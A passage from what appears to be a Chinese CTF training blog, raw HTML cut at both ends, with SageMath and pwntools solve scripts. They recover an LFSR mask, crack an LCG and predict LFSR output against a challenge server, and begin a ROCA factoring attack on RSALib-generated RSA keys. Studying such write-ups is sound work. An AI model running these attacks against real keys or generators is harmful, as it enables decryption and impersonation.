class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(KEY.bit_length()==LENGTH)</span><br><span class="line"><span class="keyword">assert</span>(MASK.bit_length()==LENGTH)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    l = lfsr(KEY,MASK,LENGTH)</span><br><span class="line">    r = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">63</span>):</span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            b = (b&lt;&lt;<span class="number">1</span>)+l.next()</span><br><span class="line">        r += pad(bin(b)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'output'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r)</span><br></pre></td></tr></table></figure><p>BM算法的前提是要有<span class="math inline">\(2\cdot LENGTH\)</span>个连续比特，而密文仅给出<span class="math inline">\(2\cdot LENGTH-8\)</span>个连续比特</p><p>因此通过爆破末尾8个比特校验<code>FLAG[7:11]=='1224'</code></p><p>本题类似<a href="https://0xdktb.top/2020/03/12/Summary-of-Crypto-in-CTF-stream/#lfsr---known-plain-attack">https://0xdktb.top/2020/03/12/Summary-of-Crypto-in-CTF-stream/#lfsr---known-plain-attack</a></p><p>原理可参照<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr/#bm-algorithm" target="_blank" rel="noopener">WIKI</a></p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[88]:</span></span><br><span class="line">cipher = open(<span class="string">'output'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[89]:</span></span><br><span class="line">cipher = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[90]:</span></span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line">X = []</span><br><span class="line">S = []</span><br><span class="line">LENGTH = <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH):</span><br><span class="line">    X.append(cipher[i : i + LENGTH])</span><br><span class="line">    S.append(cipher[i + LENGTH])</span><br><span class="line">X = Matrix(F2, X)</span><br><span class="line">S = Matrix(F2, S)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[91]:</span></span><br><span class="line">X, S</span><br><span class="line"><span class="comment"># Out[91]:</span></span><br><span class="line">(<span class="number">248</span> x <span class="number">256</span> dense matrix over Finite Field of size <span class="number">2</span>,</span><br><span class="line"> <span class="number">1</span> x <span class="number">248</span> dense matrix over Finite Field of size <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[92]:</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[93]:</span></span><br><span class="line">suffix = list(itertools.product(range(<span class="number">2</span>), repeat=<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[94]:</span></span><br><span class="line">MASK = []</span><br><span class="line"><span class="keyword">for</span> suf <span class="keyword">in</span> suffix:</span><br><span class="line">    X_n = X</span><br><span class="line">    c = cipher + list(suf)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH, len(cipher) - LENGTH + <span class="number">8</span>):</span><br><span class="line">        v = vector(F2, c[i : i + LENGTH])</span><br><span class="line">        X_n = X_n.stack(v)</span><br><span class="line">    S_n = Matrix(F2, list(S[<span class="number">0</span>]) + c[<span class="number">-8</span>:]).T</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msk = X_n.solve_right(S_n)</span><br><span class="line">        MASK.append(msk.T)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[95]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, feedback)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(cipher) == LENGTH)</span><br><span class="line">    cur = cipher</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LENGTH):</span><br><span class="line">        right = [cur[j] <span class="keyword">for</span> j <span class="keyword">in</span> feedback[<span class="number">1</span>:]]</span><br><span class="line">        left = right.count(<span class="number">1</span>) % <span class="number">2</span></span><br><span class="line">        key = str(left) + key</span><br><span class="line">        cur = [left] + cur[:<span class="number">-1</span>]</span><br><span class="line">    key = int(key, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[96]:</span></span><br><span class="line">KEY = []</span><br><span class="line"><span class="keyword">for</span> msk <span class="keyword">in</span> MASK:</span><br><span class="line">    feedback = []</span><br><span class="line">    fb = list(msk[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LENGTH):</span><br><span class="line">        <span class="keyword">if</span> fb[i] == <span class="number">1</span>:</span><br><span class="line">            feedback.append(i)</span><br><span class="line">    feedback.append(LENGTH)</span><br><span class="line">    delta = feedback[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">    feedback = [_ - delta <span class="keyword">for</span> _ <span class="keyword">in</span> feedback]</span><br><span class="line">    KEY.append(decrypt(cipher[:LENGTH], feedback))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[97]:</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[98]:</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> KEY:</span><br><span class="line">    flag = hashlib.sha256(hex(k)[<span class="number">2</span>:].encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">4</span>] == <span class="string">"1224"</span>:</span><br><span class="line">        print(<span class="string">"de1ctf&#123;"</span> + flag + <span class="string">"&#125;"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># de1ctf&#123;1224473d5e349dbf2946353444d727d8fa91da3275ed3ac0dedeb7e6a9ad8619&#125;</span></span><br></pre></td></tr></table></figure><h3 id="网鼎杯2020朱雀组---guess_game">网鼎杯2020朱雀组 - guess_game</h3><h4 id="题目考点-1">[题目考点]</h4><ul><li>LCG - unknown (a, b, m)</li><li>BM algorithm</li></ul><h4 id="题目文件-1">[题目文件]</h4><p>并不是朱雀组der- -赛中V👴分享了下，虽然都是已知考点，但过程还是有点繁琐</p><p>于是自己写dockerfile做了下复现</p><p><a href="dockerfile.zip">Click Here to Download</a></p><h4 id="题解分析-1">[题解分析]</h4><p><code>configure</code>选取Game Level时，其对应的level code是由LCG生成的，所有参数均未知，但回显给出连续六个数据，采用之前提到的trick即可，<a href="https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#lcg---unknown-a-b-m">https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#lcg---unknown-a-b-m</a></p><p>LCG crack成功以后，拿到的level对应coin为10，因此在LFSR predict时可以用9个coin去换连续9个LFSR输出，即得到连续72bits.</p><p>知n=39，BM algorithm(末尾6bits采用爆破)即可...但仅余1个coin，所以从BM的多组解中随机选择发送，失败即重新remote.</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> re, itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_LCG</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice:\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">        data.append(int(io.recvline().strip()))</span><br><span class="line">    delta = [d1 - d0 <span class="keyword">for</span> (d0, d1) <span class="keyword">in</span> zip(data, data[<span class="number">1</span>:])]</span><br><span class="line">    m_mul = [d0 * d2 - d1 * d1 <span class="keyword">for</span> (d0, d1, d2) <span class="keyword">in</span> zip(delta, delta[<span class="number">1</span>:], delta[<span class="number">2</span>:])]</span><br><span class="line">    m = reduce(GCD, m_mul)</span><br><span class="line">    factors = factor(m)</span><br><span class="line">    <span class="keyword">if</span> len(factors) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> (prime, degree) <span class="keyword">in</span> factors:</span><br><span class="line">            <span class="keyword">if</span> size(prime) == <span class="number">64</span>:</span><br><span class="line">                m = prime</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            m //= (prime**degree)</span><br><span class="line">    s0, s1, s2 = data[<span class="number">0</span>], data[<span class="number">1</span>], data[<span class="number">2</span>]</span><br><span class="line">    A = Matrix([</span><br><span class="line">        [s0  ,s1  ,<span class="number">1</span>/m ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">        [<span class="number">1</span>   ,<span class="number">1</span>   ,<span class="number">0</span>   ,<span class="number">1</span>/m ,<span class="number">0</span>   ],</span><br><span class="line">        [-s1 ,-s2 ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">1</span>   ],</span><br><span class="line">        [m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">        [<span class="number">0</span>   ,m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ]</span><br><span class="line">    ])</span><br><span class="line">    A = A.LLL()</span><br><span class="line">    a, b = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> A:</span><br><span class="line">        <span class="keyword">if</span> l[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> l[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> l[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">                a, b = l[<span class="number">2</span>] * m, l[<span class="number">3</span>] * m</span><br><span class="line">            <span class="keyword">elif</span> l[<span class="number">-1</span>] == <span class="number">-1</span>:</span><br><span class="line">                a, b = -l[<span class="number">2</span>] * m, -l[<span class="number">3</span>] * m</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">or</span> <span class="keyword">not</span> b:</span><br><span class="line">        print(<span class="string">"[!] crack_LCG failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    a %= m</span><br><span class="line">    b %= m</span><br><span class="line">    res = (a * data[<span class="number">-1</span>] + b) % m</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the level code:\n"</span>, str(res))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_LFSR</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice:\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">"Input your answer:\n"</span>, <span class="string">"2333"</span>)</span><br><span class="line">        ct = int(re.findall(<span class="string">r"\d+"</span>, io.recvline().decode(<span class="string">"utf-8"</span>))[<span class="number">0</span>])</span><br><span class="line">        cipher += bin(ct)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">"0"</span>)</span><br><span class="line">    cipher = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher]</span><br><span class="line">    <span class="keyword">assert</span>(len(cipher) == <span class="number">72</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_LFSR</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    F2 = GF(<span class="number">2</span>)</span><br><span class="line">    X, S = [], []</span><br><span class="line">    LENGTH = <span class="number">39</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH):</span><br><span class="line">        X.append(cipher[i : i + LENGTH])</span><br><span class="line">        S.append(cipher[i + LENGTH])</span><br><span class="line">    X, S = Matrix(F2, X), Matrix(F2, S)</span><br><span class="line">    suffix = list(itertools.product(range(<span class="number">2</span>), repeat=<span class="number">6</span>))</span><br><span class="line">    MASK = []</span><br><span class="line">    <span class="keyword">for</span> suf <span class="keyword">in</span> suffix:</span><br><span class="line">        X_n = X</span><br><span class="line">        c = cipher + list(suf)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher) - LENGTH, len(cipher) - LENGTH + <span class="number">6</span>):</span><br><span class="line">            v = vector(F2, c[i : i + LENGTH])</span><br><span class="line">            X_n = X_n.stack(v)</span><br><span class="line">        S_n = Matrix(F2, list(S[<span class="number">0</span>]) + c[<span class="number">-6</span>:]).T</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            msk = X_n.solve_right(S_n)</span><br><span class="line">            MASK.append(msk.T)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> MASK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_LFSR</span><span class="params">(ct, msk)</span>:</span></span><br><span class="line">    F2 = GF(<span class="number">2</span>)</span><br><span class="line">    nxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        x = F2(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">            x += ct[j] * msk[j]</span><br><span class="line">        ct = ct[<span class="number">1</span>:] + [int(x)]</span><br><span class="line">        nxt += (int(x) &lt;&lt; (<span class="number">7</span> - i))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your answer:\n"</span>, str(nxt))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Right!"</span> <span class="keyword">in</span> io.recvline().decode(<span class="string">"utf-8"</span>):</span><br><span class="line">        <span class="keyword">return</span> ct</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] predict_LFSR failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> crack_LCG():</span><br><span class="line">        print(<span class="string">"[+] crack_LCG success."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    cipher = get_LFSR()</span><br><span class="line">    MASK = crack_LFSR(cipher)</span><br><span class="line">    <span class="keyword">if</span> len(MASK):</span><br><span class="line">        print(<span class="string">"[+] &#123;&#125; masks have been found."</span>.format(len(MASK)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] crack_LFSR failed."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ct = cipher[<span class="number">-39</span>:]</span><br><span class="line">    msk = list(MASK[randrange(<span class="number">0</span>, len(MASK))][<span class="number">0</span>])</span><br><span class="line">    <span class="comment">#msk = list(MASK[0][0])</span></span><br><span class="line">    ct = predict_LFSR(ct, msk)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ct:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">498</span>):</span><br><span class="line">            ct = predict_LFSR(ct, msk)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> main() == <span class="literal">False</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        print(cnt)</span><br><span class="line">        io.close()</span><br><span class="line">        io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h4 id="more">[More]</h4><p>重连大概二三十次拿到flag...u1s1网鼎出题人没一个正常的</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-18_17-05-09.png"></p><h3 id="gkctf2020---backdoor">GKCTF2020 - Backdoor</h3><h4 id="题目考点-2">[题目考点]</h4><ul><li>ROCA (RSALib - CVE)</li><li>PH</li><li>Coppersmith</li></ul><h4 id="题解分析-2">[题解分析]</h4><p>这题其实还是有一定难度的- -只是这个CVE披露出来以后github早有完整的轮子（paper题被秒emmm</p><p>在此借鉴paper及github上的脚本进行适当分析：</p><p>RSALib生成大素数的规则如下： <span class="math display">\[N=(km+(65537^{a})\%M)(lm+(65537^{b})\%M)\equiv 65537^{a+b}(mod\ M).\]</span> 且M是前n个素数的乘积（n是有关size(N)的定值）：</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/image-20200525234153390.png"></p><p>由于M足够光滑，所以PH求解DLP得到c=a+b，再在<span class="math inline">\((\frac{c}{2},\frac{c+ord}{2})\)</span>上爆破a，进行Coppersmith求解k即可.</p><p>但对于现有的M，<span class="math inline">\(ord_{M}(65537)\)</span>过大，而Coppersmith partial p的界还很宽裕，因此我们考虑取得M的因子M'，使得<span class="math inline">\(ord_{M&#39;}(65537)\)</span>在满足<span class="math inline">\(size(M&#39;)\geq size(N^{\frac{1}{4}})\)</span>的情况下尽可能的小.（此界的估计参考<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#RSA-Partial-p">https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#RSA-Partial-p</a>）</p><p><strong>Get M' smaller than M (prepared for Coppersmith)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></span><br><span class="line">M = <span class="number">0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_power_factor</span><span class="params">(n)</span>:</span></span><br><span class="line">    div = []</span><br><span class="line">    <span class="keyword">for</span> (p, r) <span class="keyword">in</span> factor(n):</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            div.append(p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            div = div + [p**i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, r + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> div[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># divided by divisor(p) such that ord_p(65537)\nmid order</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_Gen_M_smaller</span><span class="params">(M, order)</span>:</span></span><br><span class="line">    M_factor = [_[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> M.factor()]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> M_factor:</span><br><span class="line">        p_order = Zmod(p)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line">        <span class="keyword">if</span> order % p_order != <span class="number">0</span>:</span><br><span class="line">            M //= p</span><br><span class="line">    <span class="keyword">return</span> M, Zmod(M)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get M' smaller than M</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Gen_M_smaller</span><span class="params">(M, bound)</span>:</span></span><br><span class="line">    candidates = [(M, Zmod(M)(<span class="number">65537</span>).multiplicative_order())]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        M_smaller, order = candidates[<span class="number">-1</span>][<span class="number">0</span>], candidates[<span class="number">-1</span>][<span class="number">1</span>]</span><br><span class="line">        order_factor = prime_power_factor(order)</span><br><span class="line">        candidates = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> order_factor:</span><br><span class="line">            new_M, new_order = sub_Gen_M_smaller(M_smaller, order // p)</span><br><span class="line">            param = (log(order, <span class="number">2</span>) - log(new_order, <span class="number">2</span>)) / (log(M_smaller, <span class="number">2</span>) - log(new_M, <span class="number">2</span>)) <span class="comment"># 衡量阶下降速度的参数</span></span><br><span class="line">            candidates.append((new_M, new_order, param))</span><br><span class="line">        candidates = sorted(candidates, key=<span class="keyword">lambda</span> x:x[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> size(candidates[<span class="number">-1</span>][<span class="number">0</span>]) &lt; bound:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> M_smaller, order</span><br><span class="line"></span><br><span class="line"><span class="comment"># size(n)//4 -&gt; Coppersmith bound</span></span><br><span class="line">M_smaller, order = Gen_M_smaller(M, size(n) // <span class="number">4</span>)</span><br><span class="line"><span class="comment"># (1134636716748630821225010071671110, 21840)</span></span><br></pre></td></tr></table></figure><p>获得M'后，我们仍可以将p表示作<span class="math inline">\(k&#39;M&#39;+(65537^{a&#39;})\%M&#39;\)</span>，且<span class="math inline">\(k&#39;&lt;N^{\frac{1}{4}}\)</span>.</p><p><code>for a in range(c//2, (c + ord) // 2)</code>上Coppersmith求解<span class="math inline">\(f=k*M+pow(65537,a,M)\)</span>即可.</p><p>但Coppersmith构造的系数矩阵相关参数mm, tt及解的上界X在默认情况下，于本题效果极差- -</p><p>回到paper发现有对参数构造的方案：</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_00-51-58.png"></p><p>这里的<span class="math inline">\((mm,tt)\)</span>在paper中并未给出具体证明，应该是实验性得到的数据- -</p><p>值得注意的是，paper中给出的(5, 6)是针对<code>Gen_M_smaller(M, 512 // 4)</code>给出的，至于能让阶更小的<code>Gen_M_smaller(M, size(n) // 4)</code>对应的参数可能又不相同...这里暂未实验</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 